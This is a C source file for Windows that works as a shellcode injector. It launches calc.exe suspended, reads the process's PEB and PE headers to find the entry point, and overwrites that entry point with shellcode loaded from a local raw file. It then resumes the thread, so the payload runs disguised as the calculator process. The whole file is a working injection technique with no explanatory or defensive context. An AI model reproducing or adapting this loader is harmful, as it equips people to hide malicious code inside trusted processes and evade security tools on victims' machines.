#include <windows.h>
#include <stdio.h>
#include <winternl.h>

int main(int argc, char* argv[])
{

	printf("Creating process\r\n");

	LPSTARTUPINFOA si = (LPSTARTUPINFO)calloc(1, sizeof(STARTUPINFOA));
	LPPROCESS_INFORMATION pi = (LPPROCESS_INFORMATION)calloc(1, sizeof(PROCESS_INFORMATION));

	if (!CreateProcessA
	(
		"C:\\Windows\\sysWOW64\\calc.exe", // Process uses LoadLibraryA and GetProcAddress. TODO: shellcode with LDR.
		NULL,
		NULL,
		NULL,
		NULL,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		si,
		pi
	))
	{
		printf("Error with CreateProcessA - %d", GetLastError());
		return 1;
	}

	if (!pi->hProcess)
	{
		printf("Error creating process - %d", GetLastError());
		return 1;
	}

	HANDLE hDestProcess = pi->hProcess;

	PROCESS_BASIC_INFORMATION* pbi = (PROCESS_BASIC_INFORMATION*)calloc(1, sizeof(PROCESS_BASIC_INFORMATION));
	DWORD retLen = 0;

	if (NtQueryInformationProcess(hDestProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &retLen))
	{
		printf("Error finding peb - %d", GetLastError());
		return 1;
	}

	DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 0x8;
	printf("Peb offset: %p\n", pebImageBaseOffset);

	LPVOID destImageBase = 0;
	SIZE_T bytesRead;

	if (!ReadProcessMemory(hDestProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead))
	{
		printf("Error getting process's image base - %d", GetLastError());
		return 1;
	}

	printf("Process image base: %p\n", destImageBase);

	// Read the headers
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)malloc(sizeof(IMAGE_DOS_HEADER));
	ReadProcessMemory
		(hDestProcess, destImageBase, dosHeader, sizeof(IMAGE_DOS_HEADER), NULL);

	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)malloc(sizeof(IMAGE_NT_HEADERS));
	ReadProcessMemory
		(hDestProcess, (DWORD_PTR)destImageBase + dosHeader->e_lfanew, ntHeaders, sizeof(IMAGE_NT_HEADERS), NULL);

	DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
	DWORD entryPointAddr = (DWORD_PTR)destImageBase + entryPointRVA;

	// Read source file
	HANDLE sourceFile = 
		CreateFileA("D:\\other_projects\\process_hollowing\\LDR_shellcode_raw", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
	DWORD fileBytesRead = 0;
	LPVOID sourceFileBytes = (LPVOID)malloc(sourceFileSize);
	ReadFile(sourceFile, sourceFileBytes, sourceFileSize, &fileBytesRead, NULL);

	DWORD bytesWritten = 0;
	BOOL writeSuccess = WriteProcessMemory(hDestProcess, entryPointAddr, sourceFileBytes, fileBytesRead, &bytesWritten);
	if (!writeSuccess)
	{
		printf("Problem writing to memory - %d", GetLastError());
		return 1;
	}

	// Resume the main thread
	ResumeThread(pi->hThread);
	printf("Process main thread resumed");

	// Close handles
	CloseHandle(pi->hProcess);
	CloseHandle(pi->hThread);

	return 0;
}